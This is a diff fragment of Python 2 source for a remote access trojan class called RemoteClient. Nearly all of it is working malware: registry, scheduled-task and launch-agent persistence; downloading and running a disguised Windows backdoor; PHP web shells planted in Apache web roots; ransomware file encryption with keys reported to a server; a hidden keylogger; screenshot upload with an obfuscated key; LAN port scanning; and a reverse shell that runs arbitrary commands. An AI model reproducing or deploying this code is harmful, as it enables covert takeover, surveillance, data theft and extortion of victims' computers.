-                except: pass
-                try:
-                    schtask = subprocess.Popen('schtasks /create /tn {} /tr {} /sc {} /f'.format(self.fname, sys.argv[0], interval), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
-                    out,err = schtask.communicate()
-                    self.persistence.get('scheduled tasks').append(self.fname)
-                except: pass
-            except Exception as w:
-                if self.debug:
-                    print "Persistence error: {}".format(str(w))
-            result = "\n\n" + "\n\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.keys()]) + "\n\n"
+                run_key     = r'Software\Microsoft\Windows\CurrentVersion\Run'
+                key_name    = os.path.splitext(os.path.basename(sys.argv[0]))[0]
+                reg_key     = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
+                SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
+                CloseKey(reg_key)
+                self.persistence.get('registry keys').append((run_key, key_name))
+            except: pass
+            try:
+                direct = os.popen('attrib +h {}'.format(sys.argv[0])).read()
+                self.persistence.get('hidden files').append(sys.argv[0])
+            except: pass
+            try:
+                schtask = os.popen('schtasks /create /tn {} /tr {} /sc {} /f'.format(key_name, key_value, interval)).read()
+                self.persistence.get('scheduled tasks').append(schtask)
+            except: pass
 
         elif sys.platform in ('darwin','ios'):
             try:
@@ -467,16 +318,13 @@ class RemoteClient(object):
             try:
                 osx_paths = ['var','tmp','lib','local','cache']
                 osx_files = ['.local','.cache','.fsevents','.V100_Spotlight','.bash_profile']
-                fpath = os.path.join(self._choice(osx_paths), self._choice(osx_files))
-                fpath = self._tempfile(base=fpath)
-                if not os.path.isdir(os.path.dirname(fpath)):
-                    os.makedirs(fpath)
-            except Exception as e4:
-                return 'Backdoor failed with error: %s' % str(e4)
-
+                fpath = os.path.join(self.choice(osx_paths), self.choice(osx_files))
+                os.makedirs(fpath) if not os.path.isdir(fpath) else None
+            except:
+                fpath = os.path.join(os.environ.get('TEMP', failobj=os.getcwd()), self.choice(osx_files))
             try:
-                plist       = get(os.path.join(self.urls['raw'], 'Info.plist')).text.encode()
-                label       = self._choice(['updates','cache','itunes','spotlight','archives'])
+                plist       = get(self.urls.get('plist')).text.encode()
+                label       = self.choice('updates','cache','itunes','spotlight','archives')
                 infoPlist   = plist.replace('__LABEL__',label).replace('__SELF__', sys.argv[0])
 
                 with file(fpath, 'w') as fp:
@@ -488,81 +336,264 @@ class RemoteClient(object):
                 os.startfile(fpath)
             except:
                 pass
+        return True
 
-            result = "\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.iterkeys()])
-        else:
-            result = "\nPersistence not yet available for " + self.platform + "\n"
-
-        return result
-
-    def unzip(f):
-        if os.path.isfile(f):
+    def _backdoor(self, **kwargs):
+        """Drops a backdoor on client host machine"""
+        if sys.platform in ('darwin','ios'):
+            if 'make_osx_app' not in globals():
+                osx_app_file = self.wget(self.urls.get('make_osx_app'))
+                with open(osx_app_file, 'r') as fp:
+                    osx_app  = fp.read()
+                make_osx_app = create_module(osx_app, 'make_osx_app')
             try:
-                with zipfile.ZipFile(f) as zf:
-                    zf.extractall('.')
-                    return 'File {} extracted.'.format(f)
-            except zipfile.BadZipfile:
-                return 'Error: Failed to unzip file.'
-        else:
-            return 'Error: File not found.'
+                appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
+                iconfile     = self.wget(self.urls.get('icon_icns'), path=icon_path)
+                payload_file = self.wget(self.urls.get('osx_backdoor'))
+                with file(payload_file, 'r') as fr:
+                    payload = fr.read()
+                osx_payload  = payload.replace('__HOST__', self.ip).replace('__PORT__', self.backdoor_port).replace('__APPNAME__',appname)
+                try:
+                    app_bundle = globals()['make_osx_app'].main(osx_payload, icon=iconfile, version='27.0.0.170')
+                except Exception as u:
+                    if self.debug:
+                        print "Mac OS X make app bundle error: {}".format(str(u))
+                os.chmod(payload_path, 0755)
+                if not self.backdoors.has_key('launch agent'):
+                    self.backdoors.update({'launch agent': []})
+                self.backdoors.update({'app':str(os.getcwd() + os.sep + appname + '.app'), 'launch agent':str('~/Library/LaunchAgents/com.apple.'+appname)})
+                return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
+            except Exception as y:
+                if self.debug:
+                    print "Mac OS X backdoor error: {}".format(str(y))
+
+        elif os.name is 'nt':
+            try:
+                if not self.backdoors.has_key('pupy'):
+                    self.backdoors.update({'pupy': []})
+                tn = 'MicrosoftUpdateManager'
+                bd = self.wget(self.urls.get('windows_payload'), path=tn)
+                if 'Error' not in bd:
+                    self.backdoors.get('pupy').append(bd)
+                    _ = os.popen('attrib +h {}'.format(os.path.abspath(bd))).read()
+                    __  = os.popen(bd).read()
+                    ___ = os.popen('schtasks /create /tn {} /tr {} /sc hourly'.format(tn, bd)).read()
+                    self.persistence.get('hidden files').append(bd)
+                    self.persistence.get('scheduled tasks').append(tn)
+                    return 'Success - backdoor listening on {} at port {}'.format(str(self.ip), str(self.backdoor_port))
+                else:
+                    return 'Failed to download backdoor'
+            except Exception as ee:
+                if self.debug:
+                    print 'Windows backdoor failed with error: {}'.format(str(ee))
+
+        elif 'linux' in sys.platform or 'bsd' in sys.platform:
+            try:
+                result = []
+                if not self.backdoors.has_key('apache'):
+                    self.backdoors.update({'apache':[]})
+                if subprocess.call('service --status-all | grep apache2',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0 and os.path.isdir('/var/www/html'):
+                    php = self.wget(self.urls.get('linux_payload'), path='/var/www/html/.apache.php')
+                    self.backdoors.get('apache').append(path)
+                    result.append("Embedded backdoor in the Apache web server root directory: '" + path + "'")
+                    items = [i for i in os.listdir('/var/www/html') if os.path.isdir(i)]
+                    for doc in items: 
+                        np = os.path.join(os.path.abspath(doc), '.apache.php')
+                        payload = self.wget(self.urls.get('linux_payload', path=np))
+                        result.append("Embedded backdoor in a website document root as: " + np)
+                        self.backdoors.append(np)
+                    if subprocess.call('service apache2 start',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0:
+                        result.append("Apache webserver now running on client host machine...")
+                    return "\n".join(result)
+            except Exception as bderr:
+                if self.debug:
+                    print "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
+                return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
+
+    def _install_update(self, name, executable, version):
+        """Update worker function"""
+        try:
+            updatePath  = os.environ.get('TEMP', failobj=os.getcwd())
+            updateName  = os.path.join(updatePath, executable)
+            updateUrl   = 'http://{}/{}'.format(socket.getpeername()[0], os.path.basename(sys.argv[0]))
+            getUpdate   = self.wget(updateUrl)
+        except Exception as ue:
+            return "Update download from '{}' failed with error: {}".format(url, str(ue))
+
+        if os.name is 'nt':
+            try:
+                p = subprocess.Popen('@ECHO OFF',0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
+                p.communicate('start /b /d ' + updatePath + ' ' + executable)
+            except Exception as f:
+                if self.debug:
+                    return "Update failed with error: {}".format(str(f))
+
+        elif sys.platform.starswith('darwin'):
+            try:
+                bundle          = name.replace(' ','')
+                bundleVersion   = bundle + " " + version
+                bundleIdentify  = "com.apple." + bundle
+                appPath         = os.getcwd() + os.sep + bundle + '.app'
+                os.makedirs(appPath + os.sep + 'Contents' + os.sep + 'MacOS')
+                os.mkdir(appPath + os.sep + 'Contents' + os.sep + 'Resources')
+                icon            = self.wget(self.urls.get('icon_icns'), path=str(appPath + os.sep + 'Contents' + os.sep + 'Resources' + os.sep + 'icon.icns'))
+                infoPlist       = get(self.urls.get('plist')).text.encode() % (exe, bundleVersion, icon, bundleIdentify, bundle, bundleVersion, version)
+
+                with file(str(appPath + os.sep + 'Contents' + os.sep + "PkgInfo"), "w") as fp:
+                    fp.write("APPL????")
+
+                with file(appPath + os.sep + 'Contents' + os.sep + 'Info.plist', "w") as fw:
+                    fw.write(infoPlist)
+
+                os.chmod(appPath + os.sep + 'Contents' + os.sep + 'MacOS' + os.sep + exe, 0755)
+
+            except Exception as e:
+                if self.debug:
+                    print "Update error: {}".format(str(e))
+
+    def _ransom_update(self, filename):
+        """Update ransom database"""
+        try:
+            stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
+            self._send(stmt, method='query')
+        except Exception as e:
+            return "Ransom database update error: {}".format(str(e))
+
+    def _ransom(self, arg, dirname, fnames):
+        """Ransom worker function"""
+        errors = [e for e in map(self._ransom_update, [x for x in map(self.encrypt_file, [os.path.join(dirname, i) for i in fnames]) if x]) if e]
+        if errors:
+            if self.debug:
+                print "Warning: ransom worker returned the following error(s):\n{}".format("\n".join(errors))
+
+    def _purge_regkeys(key_name):
+        """Cleaner helper function for purging Windows registry keys created for persistence"""
+        all_keys = self.persistence.get('registry keys').keys()
+        for key in all_keys:
+            run_key = key[0]
+            value   = key[1]
+            try:
+                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_ALL_ACCESS)
+                DeleteValue(reg_key, value)
+                CloseKey(reg_key)
+            except Exception as e:
+                if self.debug:
+                    print "Destruct error: {}".format(str(e))
+
+    def _unschedule_tasks(self):
+        """Cleaner helper function"""
+        all_tasks = self.persistence.get('scheduled tasks')
+        for schtask in all_tasks:
+            task = schtask.split('"')[1]
+            try:
+                delete = subprocess.Popen(['schtasks','/delete','/tn',task,'/f'],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
+                output,error = delete.communicate()
+                if 'SUCCESS' not in output:
+                    if self.debug:
+                        print "Delete scheduled task failed to remove task with name: {}".format(task[0])
+            except Exception as e:
+                if self.debug:
+                    print "Destruct error: {}".format(str(e))
+
+    def _remove_backdoors(self):
+        """Cleaner function"""
+        for bd in self.backdoors: 
+            if os.path.isfile(bd):
+                try:
+                    os.remove(bd)
+                except Exception as t:
+                    if self.debug:
+                        print "Remove backdoor returned error: {}".format(str(t))
+
+            elif os.path.isdir(bd):
+                if not os.name=='nt':
+                    try:
+                        r = subprocess.check_output(['rm','-rf',bd],shell=True)
+                    except Exception as er:
+                        if self.debug:
+                            print "Remove backdoor returned error: {}".format(str(er))
+                else:
+                    try:
+                        r = subprocess.Popen(['rmdir','/s','/q',bd],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
+                    except Exception as p:
+                        if self.debug:
+                            print "Remove backdoor returned error: {}".format(str(p))
+
+    def register_client(self):
+        """Register client host machine on server database"""
+        return self.register()
 
     def mac_address(self):
+        """Use the hardware id (MAC address) to uniquely identify the host machine"""
         return self.mac
 
-    def kill(self, sock=None):
+    def kill(self):
+        """End client connection"""
         try:
-            if not sock:
-                sock = self.socket
-            try:
-                sock.shutdown(socket.SHUT_RDWR)
-            except:
-                pass
-            try:
-                sock.close()
-            except:
-                pass
-        except Exception as e:
-            if self.debug:
-                print "Kill client failed with error: {}".format(str(e))
+            _ = sock.close()
+        except:
+            pass
+        exit()
 
-    def upload_result(filename):
+    def portscan(self, ip):
+        """Scan the given host and returns open ports"""
         try:
-            with open(filename, 'r') as fd:
-                content = b64encode(fd.read())
-            url     = 'https://api.github.com/gists'
-            header  = {'Content-type':'application/x-www-form-urlencoded'}
-            name    = choice(words['adjectives']).title() + choice(words['nouns']).title()
-            coding  = 'json' if os.path.splitext(filename)[1] == 'json' else 'base64'
-            files   = {filename: {"content": content, "encoding": coding}}
-            datas   = dumps({"description": name, "public": "true", "files": files})
-            result  = post(url, data=datas, headers=header).json()
+            socket.inet_aton(ip)
+        except socket.error:
+            return 'Error: Invalid IP address.'
+
+        result = []
+        for p in [21, 22, 23, 25, 53,
+                  80, 110, 111, 135, 139,
+                  143, 179, 443, 445, 514,
+                  993, 995, 1723, 3306, 3389,
+                  5900, 8000, 8080, 8443, 8888]:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            c = s.connect_ex((ip, p))
+            socket.setdefaulttimeout(0.5)
+            if not c:
+                result.append(p)
+        if len(result):
             return result
-        except Exception as e:
-            return 'Upload result failed with error: %s' % str(e)
-
-    def get_module(self, name, action=None):
+        return
+        
+    def unzip(self, action):
+        """Unzip compressed file"""
         global create_module
-        if name not in sys.modules:
-            try:
-                url     = self._request('modules')
-                encoded = get(url).json()
-                name, _ = os.path.splitext(os.path.basename(encoded['path']))
-                code    = b64decode(encoded['content'])
-                module  = create_module(code, name)
-                return module(action) if action else module()
-            except Exception as e:
-                return "Attempted to download module '%s'.\nDownload failed with error: %s" % (str(name), str(e))
-
-    def uac(self):
         try:
-            ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(sys.argv[0]))
-            sys.exit(0)
+            if 'unzip' in globals():
+                result = globals()['unzip'](action)
+                return result
+            else:
+                unzip = create_module(get(self.urls['unzip']).text.encode(), 'unzip')
+                result = unzip(action)
+                return result
         except Exception as e:
-            if self.debug:
-                print "UAC error: {}".format(str(e))
-            return True
+            return "Unzip returned error: {}".format(str(e))
+    
+    def lan(self):
+        """
+        Local network port scan
+        """
+        result = None
+        subnet = filter(self._ping, ['.'.join(self.localhost.split('.')[:-1]) + '.' + str(i) for i in range(1,255)])
+        if len(subnet):
+            for ip in subnet:
+                ports  = self.portscan(ip)
+                if len(ports):
+                    result = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]
+                    for p in ports:
+                        state   = 'open'
+                        service = ' '.join(self._services().get(str(p))).title() if not self.services else ' '.join(self.services.get(str(p))).title()
+                        result.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))
+                    result.append('')
+        if result:
+            return result
+        else:
+            return "No live hosts detected in local area network"
 
     def ransom(self, path):
+        """Encrypt the selected file or all files in the selected directory"""
         if os.path.isfile(path):
             _ = self.encrypt_file(path)
         elif os.path.isdir(path):
@@ -570,23 +601,41 @@ class RemoteClient(object):
                 os.path.walk(path, self._ransom, None)
             except Exception as e:
                 if self.debug:
-                    return "Ransom error: {}".format(str(e))
+                    print "Ransom error: {}".format(str(e))
+                return "Ransom error: {}".format(str(e))
         return "Successfully encrypted '{}'".format(path)
 
+    def run_persistence(self):
+        """
+        Establish persistence on host machine
+        """
+        self._persistence()
+        output = []
+        for k in self.persistence:
+            if len(self.persistence[k]):
+                output.append('')
+                output.append('[{:>8}]'.format(k.title()))
+                for i in self.persistence.get(k):
+                    if len(i): 
+                        output.append('\t{:>10}'.format(i))
+        return '\n'.join(output) + '\n'
+
     def encrypt_file(self, filename):
+        """Encrypt a file on client host machine"""
         if os.path.isfile(filename):
             try:
                 with file(filename, 'r') as fp:
                     data = fp.read()
                 with file(filename, 'w') as fc:
                     fc.write(self._encrypt(data))
-                return self._ransom_update(filename)
+                return filename
             except Exception as e:
                 if self.debug:
                     print "File encryption returned an error: {}".format(str(e))
-
+            
     def decrypt_file(self, filename):
-        if os.path.isfile(filename):
+        """Decrypt a file encrypted by the client on the host machine:"""
+        if os.path.isfile(filename):        
             try:
                 with file(filename, 'r') as fp:
                     data = fp.read()
@@ -596,25 +645,22 @@ class RemoteClient(object):
             except Exception as e:
                 if self.debug:
                     print "File decryption returned an error: {}".format(str(e))
-
-    def cd(self, path):
-        try:
-            os.chdir(path)
-            return 'Current directory: {}'.format(os.getcwd())
-        except Exception as e:
-            return 'Change directory returned error: {}'.format(str(e))
-
-    def cat(self, filepath):
-        if os.path.isfile(filepath):
+      
+    def cat(self, file_path):
+        """Emulates the UNIX command for Windows compatability with Windows"""
+        if os.path.isfile(file_path):
             try:
-                with open(filepath) as f:
+                with open(file_path) as f:
                     return f.read(4000)
             except IOError:
                 return 'Error: Permission denied.'
         else:
             return 'Error: File not found.'
-
+        
     def ls(self, path='.'):
+        """
+        Emulates the UNIX command for Windows compatability with Windows
+        """
         if os.path.exists(path):
             try:
                 return '\n'.join(os.listdir(path))
@@ -624,9 +670,19 @@ class RemoteClient(object):
             return 'Error: Path not found.'
 
     def pwd(self):
+        """
+        Emulates the UNIX command for Windows compatability with Windows
+        """
         return os.getcwd()
 
+    def cd(self, path='.'):
+        """
+        Emulates the UNIX command for Windows compatability with Windows
+        """
+        return os.chdir(path)
+
     def destruct(self):
+        """Purges host machine of any trace of the client (hidden files, registry keys, backdoors, etc.)"""
         try:
             for bd in self.backdoors:
                 try:
@@ -634,7 +690,7 @@ class RemoteClient(object):
                 except Exception as z:
                     if self.debug:
                         print "Backdoor-destruct error: {}".format(str(z))
-
+                        
             for k in self.files.keys():
                 for f in self.files.get(k):
                     if os.path.isfile(f):
@@ -707,89 +763,90 @@ class RemoteClient(object):
         finally:
             exit()
 
-    def network_scan(self, target=None):
-        if not target:
-            target = self.ip
-            result = self.local_network
-        else:
-            result = {}
-
-        subnet = filter(self._ping, ['.'.join(target.split('.')[:-1]) + '.' + str(i) for i in range(1,255)])
-
-        for ip in subnet:
-            result[ip] = self.portscan(ip)
-
-        return '\n\n'.join([result[ip] for ip in subnet])
-
     def wget(self, url, base=None):
+        """Emulates the UNIX command for Windows compatability with Windows"""
         if not url.startswith('http'):
             return 'Error: URL must begin with http:// or https:// '
         try:
-            data = get(url).text.encode()
-        except Exception as x:
-            return "Wget '%s' returned error: %s" % (str(url), str(x))
-
-        filetype    = os.path.splitext(url)[1]
-        filename    = os.path.basename(os.path.splitext(url)[0])
-        tempfile    = self._tempfile(base, filetype) if base else self._tempfile(base=filename, extension=filetype)
-
-        if extension in ('.exe','.sh'):
-            with file(filename, 'wb') as fp:
-                fp.write(data)
-        else:
-            with file(filename, 'w') as fp:
-                fp.write(data)
-        return filename
+            xt   = os.path.splitext(url)[1]
+            fn   = self._tempfile(base, xt=ext) if base else self._tempfile(ext=xt)
+            data = get(url).content
+            with file(fn, 'wb') as fp:
+                fp.write(fn.read())
+            return fn
+        except Exception as e:
+            if self.debug:
+                print "Wget download for URL '{}' failed with error: {}".format(url, str(e))
 
     def screenshot(self):
         global create_module
-        if 'screenshot' not in sys.modules:
-            self.get_module('screenshot')
+        """Takes a screenshot on host machine, uploads it to a public image board, and returns the url of the image"""
+        try:
+            if 'screenshot' not in globals():
+                code = get(self.urls.get('screenshot')).text.encode()
+                mod  = create_module(code, 'screenshot')
 
-        pic = sys.modules['screenshot']()
+            pic = globals()['screenshot'].main()
 
-        with open(pic, 'rb') as fp:
-            contents = b64encode(fp.read())
+            with open(pic, 'rb') as fp:
+                contents = b64encode(fp.read())
 
-        a = 'MDA0MWU3NjVkZTQ3NDQyMTQ2ZTg0MDk2OGZlMjNmNDdmNTdjMjIzMGM2NDljMzQ3MWJiY2VhNDE0NWE2YjFmZTliODcxMTg0NDZjOTJjZjkyMTI2YTU4N2NmMjk3YWVmMjYzMTBlNA==','ZmY0M2Q2OWM1Yjk2YjkwZWU2NzVkOWI2ODk5OTVlYjdmODg1NTRmYzgyMGRlMzU0MWNkMDE5ODE3NGY0ZDQ4NmViYjJlOTMwMTM1NTNlNzcwYjYzZjA0N2M4ODA3MzhkMTMwZDE0ZDZkYjU0ODM3NmM3YzQ3NjdhMTU2M2FiNzM3MzUyMTUzOWI2ZDYwMGUzN2FmZTAzZTI0NDQ2ODMxZDBhNzUyYmM2NWZkMzY1NGQxYjMzODdlYjhhYzg1OTQ2YjFhYjMzZDlkNTQ5MTM5NGI4OTY4NGQ2MTJiZWI3NDJlYjczMjdlMzg='
-        b = post(self.urls.get('imgur'), headers={self._deobfuscate(a[0]) : self._deobfuscate(a[1])}, data={'image':contents, 'type':'base64'})
-        return b.json().get('data').get('link').encode()
+            a = 'MDA0MWU3NjVkZTQ3NDQyMTQ2ZTg0MDk2OGZlMjNmNDdmNTdjMjIzMGM2NDljMzQ3MWJiY2VhNDE0NWE2YjFmZTliODcxMTg0NDZjOTJjZjkyMTI2YTU4N2NmMjk3YWVmMjYzMTBlNA==','ZmY0M2Q2OWM1Yjk2YjkwZWU2NzVkOWI2ODk5OTVlYjdmODg1NTRmYzgyMGRlMzU0MWNkMDE5ODE3NGY0ZDQ4NmViYjJlOTMwMTM1NTNlNzcwYjYzZjA0N2M4ODA3MzhkMTMwZDE0ZDZkYjU0ODM3NmM3YzQ3NjdhMTU2M2FiNzM3MzUyMTUzOWI2ZDYwMGUzN2FmZTAzZTI0NDQ2ODMxZDBhNzUyYmM2NWZkMzY1NGQxYjMzODdlYjhhYzg1OTQ2YjFhYjMzZDlkNTQ5MTM5NGI4OTY4NGQ2MTJiZWI3NDJlYjczMjdlMzg='
+            b = post(self.urls['images'], headers={self._deobfuscate(a[0]) : self._deobfuscate(a[1])}, data={'image':contents, 'type':'base64'})
+            return b.json()['data']['link'].encode()
+        except Exception as e3:
+            return "Screenshot error: {}".format(str(e3))
         
     def keylogger(self, action):
-
+        """Drops a persistent, stealthy keylogger on client host machine [Windows only]"""
         if action not in ("start","status","stop"):
             return "usage: keylogger <start/status/stop>"
-        
         if os.name is 'nt':
             if 'start' in action:
                 if 'keylogger' in self.files:
-                    if os.path.isfile(self.files.get('keylogger')):
+                    try:
                         os.startfile(self.files.get('keylogger'))
+                    except Exception as u:
+                        return "Keylog start error: {}".format(str(u))
                 else:
-                    request  = self._send('modules', method='request')
-                    url     = self._decrypt(request.rstrip())
-                    if url.startswith('http'):
-                        egglog   = os.path.join(url, 'keylogger.py')
-                        kname    = 'egglog'
-                        interval = 'hourly'
+                    egglog   = self.urls.get('keylogger')
+                    kname    = os.path.splitext(os.path.basename(egglog))[0]
+                    interval = 'hourly'
+                    try:
                         kfile = self.wget(egglog)
                         self.persistence.update({'keylogger':[kfile]})
+                    except Exception as qe:
+                        return 'Installing keylogger failed with error: {}'.format(str(x))
+                    try:
                         os.startfile(kfile)
+                    except Exception as e:
+                        return 'Running keylogger failed with error: {}'.format(str(e))
+                    try:
                         hide = os.popen('attrib +h {}'.format(kfile)).read()
                         self.persistence.get('hidden files').append(kfile)
+                    except Exception as ie:
+                        return 'Hiding keylogger failed with error: {}'.format(str(e))
+                    try:
                         create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
                         if 'SUCCESS' in create:
                             self.persistence.get('scheduled tasks').append(kname)
-                            return create
-                    else:
-                        return 'Failed to download keylogger module (URL scheme invalid)'
+                        return create
+                    except Exception as ie:
+                        return 'Keylogger persistence failed with error: {}'.format(str(ie))
                     
             elif 'stop' in action:
-                if 'keylogger' in self.files:
+                try:
                     _ = map(os.remove, self.files.get('keylogger'))
-                tasks = [self.persistence.get('scheduled tasks').pop(i) for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
-                d = [os.popen('schtasks /delete /tn {} /f'.format(task)).read() for task in tasks]
-                return "\n".join(d)
+                except Exception as xws:
+                    if self.debug:
+                        print "Remove keylogger file returned error: {}".format(str(xws))
+                try:
+                    tasks = [self.persistence.get('scheduled tasks').pop(i) for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
+                    d = [os.popen('schtasks /delete /tn {} /f'.format(task)).read() for task in tasks]
+                    return "\n".join(d)
+                except Exception as sx:
+                    if self.debug:
+                        print "Delete keylogger tasks returned error: {}".format(str(sx))
                 
             elif 'status' in action:
                 try:
@@ -801,10 +858,11 @@ class RemoteClient(object):
             else:
                 return "Invalid command"
         else:
-            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{} platforms not yet supported for remote logging".format(sys.platform)
+            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{}-based platforms not yet supported for remote logging".format(sys.platform)
             return ans
 
     def backdoor(self, app='FlashPlayer'):
+        """Embeds hidden backdoors into the host machine filesystem"""
         try:
             result = self._backdoor(appname=app)
             return result
@@ -814,181 +872,141 @@ class RemoteClient(object):
             return "Backdoor commmand failed with error: {}".format(str(e))
 
     def restart(self, **kwargs):
+        """Update all the eggplant"""
         return Eggplant(**self.__dict__)
 
-    def install_update(self, **kwargs):
-        global create_module
-        repo = get(self.urls.get('repo')).json()
-        for i in repo:
-            if 'client.py' in i.get('name'):
-                name, _ = os.path.splitext(i.get('name'))
-                code    = get(i.get('download_url')).json().get('content')
-                module  = create_module(code, name)
-        print 'Restarting in 10...'
-        sleep(10)
-        execfile(sys.argv[0])
-        sys.exit(0)
+    def update(self, **kwargs):
+        """
+        Auto-update
+        """
+        if os.name == 'nt':
+            filename    = 'client.exe'
+            plain       = False
+            mode        = 'wb'
+        elif 'linux' in sys.platform or 'bsd' in sys.platform:
+            filename    = 'client'
+            plain       = True
+            mode        = 'w'
+        else:
+            filename    = 'client.py'
+            plain       = True
+            mode        = 'w'
+            
+        try:
+            repo = get('https://api.github.com/repos/colental/AngryEggplant/contents').json()
+            for i in repo:
+                if filename in i.get('path'):
+                    if plain:
+                        code = get(i['download_url']).text
+                    else:
+                        code = b64decode(get(i['git_url']).json()['content'])
+                        
+                    with file(sys.argv[0], mode) as fp:
+                        fp.write(code)
 
-    def run_command(self, cmd):
-        process = subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-        return str().join((process.communicate()))
+                    if self.debug:
+                        print "Update successful\nRestarting in 5..."
+                    sleep(5)
+                    execfile(sys.argv[0])
+                    sys.exit(0)
 
-    def standby(self, host):
-        while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind(('0.0.0.0', self.listen_port))
-            s.listen(1)
-            conn, addr = s.accept()
-            if addr[0] == host:
-                self.socket = conn
-                self.dhkey  = self._diffiehellman()
-                break
-            else:
-                self._kill(sock=conn)
-                return self._standby()
-        return self.run()
-
-    def run(self, connection=None):
-        while True:
-            if not connection:
-                connection = self.socket
-                
-            prompt  = "<[{}:{}#]> ".format(sys.platform.lower(), self.ip)
-            self._send(prompt, method='prompt')
+            return 'Update Failed - found no matching file in repo'
+        except Exception as e:
+            return 'Update Failed with error: {}'.format(str(e))
             
 
-            if len(cmd_buffer):
-                
-                data = self._decrypt(cmd_buffer).rstrip()
-                cmd, _, action = data.partition(' ')
-                
+    def run(self):
+        """
+        Run reverse shell
+        """
+        while True:
+            prompt          = "[{}@{} {}]> ".format(self.login, self.machine, os.getcwd())
+            self._send(prompt, method='prompt')
+            data            = self._recieve()
+            if data:
+                result          = ''
+                cmd, _, action  = data.partition(' ')
+
                 if cmd in self.commands:
-                    output = self.commands[cmd](action) if action else self.commands[cmd]()
-                    
-                elif cmd in sys.modules:
-                    output = sys.modules[cmd](action) if action else sys.modules[cmd]()
-                    
+                    try:
+                        result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                    except Exception as ce:
+                        result = "Command '{}' failed with error: '{}'".format(cmd, str(ce))
+
                 elif cmd in globals():
-                    output = globals()[cmd](action) if action else globals()[cmd]()
+                    try:
+                        result = globals()[cmd](action) if len(action) else self.commands[cmd]()
+                    except Exception as em:
+                        result = "Module '{}' failed with error: '{}'".format(cmd, str(em))
 
-                elif cmd in self.config['modules']:
-                    output = run_module(cmd, action) if action else run_module(cmd)
+                elif cmd in dir(self):
+                    try:
+                        result = getattr(self, cmd)(action) if len(action) else getattr(self, cmd)()
+                    except Exception as ea:
+                        result = "Function '{}' failed with error: '{}'".format(cmd, str(ea))
 
                 else:
-                    output = run_command(cmd, action) if action else run_command(cmd)
+                    try:
+                        result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                    except:
+                        result = ''
 
-                self._send(bytes(output), method=cmd)
-                
-        try:
-            if self.debug:
-                print 'Standing by...'
-            self.standby(self.socket.getpeername()[0])
-        except Exception as by:
-            if self.debug:
-                print 'Standby error: %s' % str(by)
-            sleep(10)
-            execfile(sys.argv[0])
-            sys.exit(0)
-
-#-----------------------------------------------
-
-def install(package):
-    if 'Crypto' in package:
-        package = 'Crypto'
-    elif 'win32' in package:
-        package = 'pywin32'
-    try:
-        _ = pip.InstallCommand().main([package])            
-    except Exception as e:
-        'Install %s failed with error: %s' % (str(package), str(e))
-
-
-def dependencies():
-    try:
-        dependencies = dict({
-                             'AES':'Crypto.Cipher',
-                             'HMAC':'Crypto.Hash',
-                             'SHA256':'Crypto.Hash',
-                             'bytes_to_long':'Crypto.Util.number',
-                             'long_to_bytes':'Crypto.Util.number'
-                            })
-        if os.name is 'nt':
-            dependencies['ShellExecuteEx'] = 'win32com.shell.shell'
-            dependencies['HKEY_CURRENT_USER'] = '_winreg'
-            dependencies['KEY_WRITE'] = '_winreg'
-            dependencies['KEY_ALL_ACCESS'] = '_winreg'
-            dependencies['REG_SZ'] = '_winreg'
-            dependencies['CloseKey'] = '_winreg'
-            dependencies['DeleteValue'] = '_winreg'
-            dependencies['OpenKey'] = '_winreg'
-            dependencies['SetValueEx'] = '_winreg'
-
-        for module in dependencies:
-            package = dependencies[module]
-            if module not in globals():
-                install(package)
-                exec "from %s import %s" % (package, module)
-        return True
-    except:
-        return False
-
-def update():
-    raw     = get(urls['modules']).json()
-    data    = b64decode(raw['content'])
-    modules = loads(data)
-    for module in modules['tree']:
-        try:
-            name, ext = os.path.splitext(module['path'])
-            if len(ext) and '__' not in name:
-                if name in sys.modules:
-                    print "Module %s successfully loaded" % name
-                else:
-                    print "Downloading module %s..." % name
-                    encoded = get(module['url']).json()['content']
-                    print "Module %s downloaded successfully" % name
-                    code = b64decode(encoded)
-                    create_module(code, name)
-                    print "Added module %s to standard module library" % name
-        except Exception as e:
-            print 'Update error: %s' % str(e)
-    return True
-
-def create_module(code, name):
-    try:
-        module = new_module(name)
-        exec code in module.__dict__
-        sys.modules[name] = module
-        globals()[name]   = module
-        return module
-    except: pass
-    
-def resource_path(relative_path):
-    return os.path.join(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))), relative_path)  
-
-def main():
